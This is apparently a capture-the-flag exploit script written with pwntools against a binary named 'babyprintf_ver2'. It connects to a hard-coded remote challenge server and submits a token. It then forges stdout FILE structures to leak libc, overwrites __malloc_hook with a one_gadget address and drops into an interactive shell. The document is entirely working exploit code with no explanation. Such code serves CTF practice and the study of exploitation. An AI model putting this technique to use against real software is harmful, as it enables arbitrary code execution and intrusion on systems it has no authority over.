# coding=utf-8
from pwn import *

def pwn():
    BIN_PATH = './babyprintf_ver2'
    DEBUG = 0
    context.arch = 'amd64'
    if DEBUG == 1:
        p = process(BIN_PATH)
        elf = ELF(BIN_PATH)
        context.log_level = 'debug'
        context.terminal = ['tmux', 'split', '-h']
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('150.109.44.250', 20005)
        elf = ELF(BIN_PATH)
        libc = ELF('./libc64.so')
        p.recvuntil('Input your token:')
        p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')
        context.log_level = 'debug'


    p.recvuntil('buffer location to')
    recv = p.recvuntil('\n', drop=True)
    bss_address = int(recv, 16)
    p.recvuntil('Have fun!\n')
    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3
    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d)
    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)

    p.sendline(payload)
    p.recvuntil('permitted!\n')
    p.sendline('a' * 8)
    recv = p.recv(8)
    libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000)
    print hex(libc.address)

    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)
    payload += p64(bss_address + 0x200) * 7
    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)

    p.sendline(payload)

    malloc_hook_addr = libc.symbols['__malloc_hook']

    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)
    payload += p64(bss_address + 0x200) * 6
    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)
    p.sendline(payload)

    p.sendline(p64(libc.address + 0x10a38c)) # one_gadget

    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)
    payload += p64(bss_address + 0x200) * 7
    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)
    p.sendline(payload)
    sleep(0.5)
    p.sendline('%49$p')
    
    p.interactive()
    p.close()


if __name__ == '__main__':
    pwn()

